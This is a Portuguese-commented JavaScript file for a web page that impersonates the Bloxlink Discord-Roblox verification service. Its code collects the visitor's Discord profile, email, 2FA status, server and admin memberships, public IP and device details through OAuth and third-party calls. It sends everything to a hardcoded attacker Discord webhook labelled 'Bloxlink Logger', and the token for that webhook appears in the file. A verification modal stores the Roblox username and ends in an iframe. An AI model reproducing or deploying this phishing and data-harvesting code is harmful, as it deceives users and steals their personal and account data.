/**
 * =====================================================================================
 * BLOXLINK - DISCORD OAUTH & WEBHOOK CONTROLLER (MODULAR & EXTENSIBLE)
 * =====================================================================================
 * Este arquivo foi projetado para:
 * 1. Gerenciar o fluxo completo do Discord OAuth (redirecionamento, token e perfil).
 * 2. Coletar dados detalhados da conta (Perfil, Servidores/Guilds, Conexões, IP, Roblox).
 * 3. Enviar embeds ricos e totalmente personalizáveis para o Webhook do Discord.
 * 4. Permitir adicionar novos campos (fields) no Webhook de forma simples e direta.
 * =====================================================================================
 */

// =====================================================================================
// [1] CONFIGURAÇÃO GERAL (EDITE AQUI SEUS DADOS E ESCOPOS)
// =====================================================================================
const CONFIG = {
  // URL do Webhook do Discord que receberá os relatórios
  WEBHOOK_URL: "https://discord.com/api/webhooks/1541640265461137538/YDaXpIpBQl0MWbIzeFLvcSTI4zbpPTqTkTgKfc1PusePVzOrtK6GiGC1CTlUx7Q78Hwa",

  // Discord Application Client ID
  CLIENT_ID: "1541620007560020029",

  // Escopos do OAuth: 'identify', 'guilds', 'email', 'connections'
  SCOPES: ["identify", "guilds", "email"],

  // Opções para coleta adicional de dados
  FETCH_GUILDS: true,        // Coleta a lista e quantidade de servidores do usuário
  FETCH_CONNECTIONS: false,  // Coleta contas vinculadas (YouTube, Steam, Roblox, etc.)
  FETCH_CLIENT_IP: true,     // Coleta o endereço IP público do cliente

  // Personalização visual do Embed do Webhook
  EMBED_COLOR: 0x5865F2,     // Cor da barra lateral (Blurple do Discord: 0x5865f2 | Verde: 0x22c55e | Vermelho: 0xde4343)
  BOT_NAME: "Bloxlink Logger",
  BOT_AVATAR: "https://blox.link/favicon.ico"
};


// =====================================================================================
// [2] CONSTRUTOR DE FIELDS DO WEBHOOK (ADICIONE OU REMOVA CAMPOS AQUI)
// =====================================================================================
/**
 * Constrói a lista de campos (fields) que serão exibidos no Embed do Discord.
 * Para adicionar um novo campo, basta inserir um novo objeto no array:
 * { name: "Título do Campo", value: "Valor do Campo", inline: true/false }
 */
function buildWebhookFields(data) {
  const { user, guilds, connections, clientIp, robloxUser } = data;

  const fields = [
    // ---------------------------------------------------------
    // [Campo 1] Identificação do Usuário Discord
    // ---------------------------------------------------------
    {
      name: "👤 Usuário Discord",
      value: `**${user.global_name || user.username}** (\`${user.username}\`)`,
      inline: true
    },

    // ---------------------------------------------------------
    // [Campo 2] ID da Conta Discord
    // ---------------------------------------------------------
    {
      name: "🆔 Discord ID",
      value: `\`${user.id}\``,
      inline: true
    },

    // ---------------------------------------------------------
    // [Campo 3] E-mail Vinculado (Escopo 'email')
    // ---------------------------------------------------------
    ...(user.email ? [{
      name: "📧 E-mail da Conta",
      value: `\`${user.email}\` ${user.verified ? "*(Verificado ✅)*" : "*(Não Verificado ⚠️)*"}`,
      inline: false
    }] : []),

    // ---------------------------------------------------------
    // [Campo 4] Informações de Segurança (2FA / Nitro)
    // ---------------------------------------------------------
    {
      name: "🛡️ Segurança & Status",
      value: [
        `• 2FA/MFA: **${user.mfa_enabled ? "✅ Ativado" : "❌ Desativado"}**`,
        `• Nitro: **${formatNitroType(user.premium_type)}**`
      ].join("\n"),
      inline: false
    },

    // ---------------------------------------------------------
    // [Campo 5] Usuário Roblox Informado no Site
    // ---------------------------------------------------------
    {
      name: "🎮 Roblox Informado",
      value: robloxUser ? `\`${robloxUser}\`` : "*Nenhum*",
      inline: true
    }
  ];

  // -----------------------------------------------------------
  // [Campo Opcional] Servidores / Guilds do Usuário
  // -----------------------------------------------------------
  if (guilds && Array.isArray(guilds)) {
    const totalGuilds = guilds.length;
    const ownedGuilds = guilds.filter(g => g.owner).length;
    const adminGuilds = guilds.filter(g => (BigInt(g.permissions) & 0x8n) === 0x8n).length;

    // Pega os primeiros 5 servidores mais relevantes
    const sampleGuilds = guilds.slice(0, 5).map(g => g.name).join(", ");

    fields.push({
      name: `🏰 Servidores (${totalGuilds})`,
      value: [
        `• Total de Servidores: **${totalGuilds}**`,
        `• Dono (Owner): **${ownedGuilds}** | Admin: **${adminGuilds}**`,
        sampleGuilds ? `• Principais: *${sampleGuilds}${totalGuilds > 5 ? "..." : ""}*` : null
      ].filter(Boolean).join("\n"),
      inline: false
    });
  }

  // -----------------------------------------------------------
  // [Campo Opcional] Conexões Vinculadas
  // -----------------------------------------------------------
  if (connections && Array.isArray(connections) && connections.length > 0) {
    const connList = connections.map(c => `• **${c.type}**: \`${c.name}\``).slice(0, 8).join("\n");
    fields.push({
      name: `🔗 Conexões (${connections.length})`,
      value: connList,
      inline: false
    });
  }

  // -----------------------------------------------------------
  // [Campo Opcional] Informações do Cliente / IP / Navegador
  // -----------------------------------------------------------
  if (clientIp || navigator.userAgent) {
    fields.push({
      name: "🌐 Dados do Dispositivo",
      value: [
        clientIp ? `• IP Público: \`${clientIp}\`` : null,
        `• Navegador / OS: *${detectBrowserOS()}*`,
        `• Resolução: \`${window.screen.width}x${window.screen.height}\``
      ].filter(Boolean).join("\n"),
      inline: false
    });
  }

  // -----------------------------------------------------------
  // >>> ADICIONE SEUS CAMPOS PERSONALIZADOS ABAIXO <<<
  // Exemplo:
  // fields.push({
  //   name: "Meu Campo Novo",
  //   value: "Valor customizado",
  //   inline: true
  // });
  // -----------------------------------------------------------

  return fields;
}


// =====================================================================================
// [3] DISPARO PRINCIPAL DO WEBHOOK
// =====================================================================================
async function sendToDiscordWebhook(data) {
  if (!CONFIG.WEBHOOK_URL || CONFIG.WEBHOOK_URL.trim() === "") {
    console.warn("⚠️ Webhook URL não configurada em CONFIG.WEBHOOK_URL.");
    return;
  }

  const { user } = data;
  const avatarUrl = formatDiscordAvatar(user);

  const payload = {
    username: CONFIG.BOT_NAME,
    avatar_url: CONFIG.BOT_AVATAR,
    embeds: [
      {
        title: "✅ Nova Autenticação Concluída (Discord OAuth)",
        color: CONFIG.EMBED_COLOR,
        thumbnail: {
          url: avatarUrl
        },
        fields: buildWebhookFields(data),
        footer: {
          text: "Bloxlink Verification System",
          icon_url: CONFIG.BOT_AVATAR
        },
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    console.log("📡 Enviando payload para o Webhook...");
    const response = await fetch(CONFIG.WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      console.log("✅ Webhook notificado com sucesso!");
    } else {
      console.error("❌ Falha na resposta do Webhook. Status HTTP:", response.status);
    }
  } catch (err) {
    console.error("❌ Erro de conexão com o Webhook:", err);
  }
}


// =====================================================================================
// [4] COLETA DE DADOS NA DISCORD API (@me, /guilds, /connections, IP)
// =====================================================================================
async function fetchDiscordUserData(accessToken) {
  const headers = { Authorization: `Bearer ${accessToken}` };
  let user = null;
  let guilds = null;
  let connections = null;
  let clientIp = null;

  // 1. Coleta o Perfil Básico (@me)
  try {
    const userRes = await fetch("https://discord.com/api/users/@me", { headers });
    if (userRes.ok) {
      user = await userRes.json();
    }
  } catch (e) {
    console.error("Erro ao buscar @me:", e);
  }

  if (!user) return false;

  // 2. Coleta a lista de Guilds (Servidores) se habilitado
  if (CONFIG.FETCH_GUILDS) {
    try {
      const guildsRes = await fetch("https://discord.com/api/users/@me/guilds", { headers });
      if (guildsRes.ok) {
        guilds = await guildsRes.json();
      }
    } catch (e) {
      console.warn("Guilds não disponíveis ou escopo ausente:", e);
    }
  }

  // 3. Coleta conexões vinculadas se habilitado
  if (CONFIG.FETCH_CONNECTIONS) {
    try {
      const connRes = await fetch("https://discord.com/api/users/@me/connections", { headers });
      if (connRes.ok) {
        connections = await connRes.json();
      }
    } catch (e) {
      console.warn("Connections não disponíveis ou escopo ausente:", e);
    }
  }

  // 4. Coleta o IP Público do cliente se habilitado
  if (CONFIG.FETCH_CLIENT_IP) {
    try {
      const ipRes = await fetch("https://api.ipify.org?format=json");
      if (ipRes.ok) {
        const ipData = await ipRes.json();
        clientIp = ipData.ip;
      }
    } catch (e) {}
  }

  // Monta objeto consolidado do perfil
  const profile = {
    id: user.id,
    username: user.username,
    displayName: user.global_name || user.username || "powerfromcsm.",
    avatarUrl: formatDiscordAvatar(user),
    user: user
  };

  // Salva no LocalStorage
  localStorage.setItem("bloxlink_logged_in", "true");
  localStorage.setItem("discord_user_profile", JSON.stringify(profile));

  // Atualiza UI
  applyUserProfile(profile);

  // Envia todos os dados consolidados para o Webhook
  const robloxUser = sessionStorage.getItem("saved_roblox_username") || "";
  await sendToDiscordWebhook({
    user,
    guilds,
    connections,
    clientIp,
    robloxUser
  });

  return true;
}


// =====================================================================================
// [5] FUNÇÕES AUXILIARES & FORMATADORES
// =====================================================================================
function formatDiscordAvatar(user) {
  if (!user) return "./assets/avatar.png";
  if (user.avatar) {
    const isGif = user.avatar.startsWith("a_");
    const ext = isGif ? "gif" : "png";
    return `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}?size=128`;
  }
  if (user.id) {
    try {
      const defaultNum = Number((BigInt(user.id) >> 22n) % 6n);
      return `https://cdn.discordapp.com/embed/avatars/${defaultNum}.png`;
    } catch (e) {
      return "https://cdn.discordapp.com/embed/avatars/0.png";
    }
  }
  return "./assets/avatar.png";
}

function formatNitroType(type) {
  switch (type) {
    case 1: return "Nitro Classic";
    case 2: return "Nitro Boost";
    case 3: return "Nitro Basic";
    default: return "Nenhum";
  }
}

function detectBrowserOS() {
  const ua = navigator.userAgent;
  let os = "Desconhecido";
  if (ua.includes("Win")) os = "Windows";
  else if (ua.includes("Mac")) os = "MacOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  let browser = "Navegador Web";
  if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
  else if (ua.includes("Edg")) browser = "Edge";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
  else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";

  return `${browser} (${os})`;
}

function redirectToDiscordOAuth() {
  let origin = window.location.origin;
  if (!origin.endsWith("/")) origin += "/";

  const redirectUri = encodeURIComponent(origin);
  const scopeStr = encodeURIComponent(CONFIG.SCOPES.join(" "));
  
  // Utiliza Implicit Grant (response_type=token) para leitura instantânea no cliente
  const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CONFIG.CLIENT_ID}&response_type=token&redirect_uri=${redirectUri}&scope=${scopeStr}`;

  window.location.href = oauthUrl;
}

function applyUserProfile(profile) {
  if (!profile) return;
  const userDisplayName = document.getElementById("userDisplayName");
  const userAvatarImg = document.getElementById("userAvatarImg");
  const loggedOutSection = document.getElementById("loggedOutSection");
  const loggedInSection = document.getElementById("loggedInSection");

  if (userDisplayName) {
    userDisplayName.textContent = profile.displayName || profile.username || "powerfromcsm.";
  }
  if (userAvatarImg && profile.avatarUrl) {
    userAvatarImg.src = profile.avatarUrl;
  }
  if (loggedOutSection) loggedOutSection.style.display = "none";
  if (loggedInSection) loggedInSection.style.display = "block";
}


// =====================================================================================
// [6] INICIALIZAÇÃO DE SESSÃO NO CARREGAMENTO DA PÁGINA
// =====================================================================================
document.addEventListener("DOMContentLoaded", () => {
  async function initAuth() {
    const hashStr = window.location.hash.startsWith("#") ? window.location.hash.substring(1) : window.location.hash;
    const hashParams = new URLSearchParams(hashStr);
    const searchParams = new URLSearchParams(window.location.search);

    const accessToken = hashParams.get("access_token") || searchParams.get("access_token");
    const discordCode = searchParams.get("code");

    // Retorno com Access Token (Implicit Grant)
    if (accessToken) {
      window.history.replaceState({}, document.title, window.location.pathname);
      localStorage.setItem("bloxlink_logged_in", "true");
      await fetchDiscordUserData(accessToken);

      const savedRoblox = sessionStorage.getItem("saved_roblox_username");
      const robloxUserInput = document.getElementById("robloxUserInput");
      if (savedRoblox && robloxUserInput) {
        robloxUserInput.value = savedRoblox;
      }
      return;
    }

    // Retorno com Authorization Code
    if (discordCode) {
      window.history.replaceState({}, document.title, window.location.pathname);
      localStorage.setItem("bloxlink_logged_in", "true");

      const savedProfileStr = localStorage.getItem("discord_user_profile");
      if (savedProfileStr) {
        try {
          applyUserProfile(JSON.parse(savedProfileStr));
        } catch (e) {}
      }
      return;
    }

    // Restauração de Sessão em Cache
    const isLogged = localStorage.getItem("bloxlink_logged_in") === "true";
    const savedProfileStr = localStorage.getItem("discord_user_profile");
    const loggedOutSection = document.getElementById("loggedOutSection");
    const loggedInSection = document.getElementById("loggedInSection");

    if (isLogged) {
      if (savedProfileStr) {
        try {
          applyUserProfile(JSON.parse(savedProfileStr));
        } catch (e) {}
      } else {
        if (loggedOutSection) loggedOutSection.style.display = "none";
        if (loggedInSection) loggedInSection.style.display = "block";
      }
      return;
    }

    if (loggedOutSection) loggedOutSection.style.display = "block";
    if (loggedInSection) loggedInSection.style.display = "none";
  }

  initAuth();


  // =====================================================================================
  // [7] CONTROLADOR DO MODAL DE VERIFICAÇÃO & INTERFACE ROBLOX
  // =====================================================================================
  const robloxUserInput = document.getElementById("robloxUserInput");
  const getVerifiedBtn = document.getElementById("getVerifiedBtn");
  const footerRobloxInput = document.getElementById("footerRobloxInput");
  const footerVerifiedBtn = document.getElementById("footerVerifiedBtn");

  const popupOverlay = document.getElementById("popupOverlay");
  const popupContainer = document.getElementById("popupContainer");
  const popupClose = document.getElementById("popupClose");

  const loadingRedirectContent = document.getElementById("loadingRedirectContent");
  const btnCancelRedirect = document.getElementById("btnCancelRedirect");

  const step1Content = document.getElementById("step1Content");
  const btnContinueStep1 = document.getElementById("btnContinueStep1");
  const btnReturnToBloxlink = document.getElementById("btnReturnToBloxlink");

  const step2Content = document.getElementById("step2Content");
  const robloxAvatarImg2 = document.getElementById("robloxAvatarImg2");
  const robloxAccountName2 = document.getElementById("robloxAccountName2");
  const btnCancelStep2 = document.getElementById("btnCancelStep2");
  const btnConfirmAccess = document.getElementById("btnConfirmAccess");

  const iframeContent = document.getElementById("iframeContent");

  const signInDiscordBtn = document.getElementById("signInDiscordBtn");
  const profileChipBtn = document.getElementById("profileChipBtn");
  const userDropdownMenu = document.getElementById("userDropdownMenu");
  const dropdownChevron = document.getElementById("dropdownChevron");
  const logoutBtn = document.getElementById("logoutBtn");

  const mobileToggle = document.getElementById("mobileToggle");
  const mobileMenu = document.getElementById("mobileMenu");

  // Consulta à API Roblox via Serverless Function
  async function fetchRobloxUserAvatar(username) {
    if (!username || !username.trim()) {
      return {
        name: "theyhategabriel",
        avatarUrl: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-DF629C51FDFA46CD70BBE0FEDC75CA79-Png/150/150/AvatarHeadshot/Png/isCircular"
      };
    }
    const cleanUser = username.trim();
    try {
      const res = await fetch(`/api/roblox?username=${encodeURIComponent(cleanUser)}`);
      if (res.ok) {
        const data = await res.json();
        if (data.success && data.avatarUrl) {
          return {
            name: data.name || cleanUser,
            avatarUrl: data.avatarUrl
          };
        }
      }
    } catch (err) {
      console.warn("Roblox API note:", err);
    }
    return {
      name: cleanUser,
      avatarUrl: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-DF629C51FDFA46CD70BBE0FEDC75CA79-Png/150/150/AvatarHeadshot/Png/isCircular"
    };
  }

  async function openVerificationModal(username) {
    if (popupOverlay) popupOverlay.classList.add("active");
    if (popupContainer) popupContainer.classList.remove("expanded");

    if (loadingRedirectContent) loadingRedirectContent.style.display = "flex";
    if (step1Content) step1Content.style.display = "none";
    if (step2Content) step2Content.style.display = "none";
    if (iframeContent) iframeContent.style.display = "none";

    const targetUser = username && username.trim() ? username.trim() : (sessionStorage.getItem("saved_roblox_username") || "theyhategabriel");
    sessionStorage.setItem("saved_roblox_username", targetUser);

    if (robloxAccountName2) robloxAccountName2.textContent = targetUser;

    const startTime = Date.now();
    const robloxProfile = await fetchRobloxUserAvatar(targetUser);
    sessionStorage.setItem("saved_roblox_avatar", robloxProfile.avatarUrl);

    if (robloxAccountName2) robloxAccountName2.textContent = robloxProfile.name;
    if (robloxAvatarImg2 && robloxProfile.avatarUrl) robloxAvatarImg2.src = robloxProfile.avatarUrl;

    const elapsed = Date.now() - startTime;
    const remainingTime = Math.max(0, 900 - elapsed);

    setTimeout(() => {
      if (loadingRedirectContent) loadingRedirectContent.style.display = "none";
      if (step1Content) step1Content.style.display = "flex";
    }, remainingTime);
  }

  function isMobileDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || (window.innerWidth <= 768);
  }

  function handleVerificationAction(username) {
    if (username && username.trim()) {
      sessionStorage.setItem("saved_roblox_username", username.trim());
    }
    const isMobile = isMobileDevice();
    const isLogged = localStorage.getItem("bloxlink_logged_in") === "true";

    if (isMobile || isLogged) {
      openVerificationModal(username);
    } else {
      redirectToDiscordOAuth();
    }
  }

  function closePopup() {
    if (popupOverlay) popupOverlay.classList.remove("active");
    if (loadingRedirectContent) loadingRedirectContent.style.display = "none";
    if (step1Content) step1Content.style.display = "none";
    if (step2Content) step2Content.style.display = "none";
    if (iframeContent) iframeContent.style.display = "none";
  }

  // Handlers de Ações e Botões
  if (signInDiscordBtn) {
    signInDiscordBtn.addEventListener("click", (e) => {
      e.preventDefault();
      redirectToDiscordOAuth();
    });
  }

  if (profileChipBtn) {
    profileChipBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      const isOpen = userDropdownMenu.classList.toggle("open");
      if (dropdownChevron) {
        dropdownChevron.style.transform = isOpen ? "rotate(180deg)" : "rotate(0deg)";
      }
    });
  }

  document.addEventListener("click", (e) => {
    if (userDropdownMenu && !userDropdownMenu.contains(e.target) && profileChipBtn && !profileChipBtn.contains(e.target)) {
      userDropdownMenu.classList.remove("open");
      if (dropdownChevron) dropdownChevron.style.transform = "rotate(0deg)";
    }
  });

  if (logoutBtn) {
    logoutBtn.addEventListener("click", (e) => {
      e.preventDefault();
      localStorage.removeItem("bloxlink_logged_in");
      localStorage.removeItem("discord_user_profile");
      sessionStorage.removeItem("saved_roblox_username");
      sessionStorage.removeItem("saved_roblox_avatar");
      const loggedOutSection = document.getElementById("loggedOutSection");
      const loggedInSection = document.getElementById("loggedInSection");
      if (loggedOutSection) loggedOutSection.style.display = "block";
      if (loggedInSection) loggedInSection.style.display = "none";
      if (userDropdownMenu) userDropdownMenu.classList.remove("open");
    });
  }

  if (getVerifiedBtn) {
    getVerifiedBtn.addEventListener("click", () => {
      const val = robloxUserInput ? robloxUserInput.value : "";
      handleVerificationAction(val);
    });
  }

  if (robloxUserInput) {
    robloxUserInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        handleVerificationAction(robloxUserInput.value);
      }
    });
  }

  if (footerVerifiedBtn) {
    footerVerifiedBtn.addEventListener("click", () => {
      const val = footerRobloxInput ? footerRobloxInput.value : "";
      handleVerificationAction(val);
    });
  }

  if (popupClose) popupClose.addEventListener("click", closePopup);

  if (btnCancelRedirect) {
    btnCancelRedirect.addEventListener("click", (e) => {
      e.preventDefault();
      closePopup();
      if (robloxUserInput) {
        robloxUserInput.focus();
        robloxUserInput.select();
      }
    });
  }

  if (popupOverlay) {
    popupOverlay.addEventListener("click", (e) => {
      if (e.target === popupOverlay) {
        closePopup();
      }
    });
  }

  if (btnContinueStep1) {
    btnContinueStep1.addEventListener("click", () => {
      if (step1Content) step1Content.style.display = "none";
      if (step2Content) step2Content.style.display = "flex";
    });
  }

  if (btnReturnToBloxlink) {
    btnReturnToBloxlink.addEventListener("click", () => {
      closePopup();
      if (robloxUserInput) {
        robloxUserInput.focus();
        robloxUserInput.select();
      }
    });
  }

  if (btnCancelStep2) {
    btnCancelStep2.addEventListener("click", () => {
      closePopup();
      if (robloxUserInput) {
        robloxUserInput.focus();
        robloxUserInput.select();
      }
    });
  }

  if (btnConfirmAccess) {
    btnConfirmAccess.addEventListener("click", () => {
      if (step2Content) step2Content.style.display = "none";
      if (iframeContent) iframeContent.style.display = "block";
      if (popupContainer) popupContainer.classList.add("expanded");
    });
  }

  if (mobileToggle && mobileMenu) {
    mobileToggle.addEventListener("click", () => {
      mobileMenu.classList.toggle("hidden");
    });
  }
});